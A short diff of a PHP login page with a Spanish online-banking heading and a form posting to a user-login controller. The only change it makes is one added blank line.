@@ -54,6 +54,7 @@ if (isset($_SESSION['error_ubicacion']) && $_SESSION['error_ubicacion']) {
             <!--Cambiar image-->
             <div class="img_trabajador"><img src="img/bcp_bycer.jpg" alt="imagen_login.jpg"></img></div>
             <div class="iniciar_sesion">
+
                 <h1>Ingresa a tu banca en línea</h1>
                 <form action="../controller/ControllerUserLogin.php" method="POST" autocomplete="off">
                     <div>
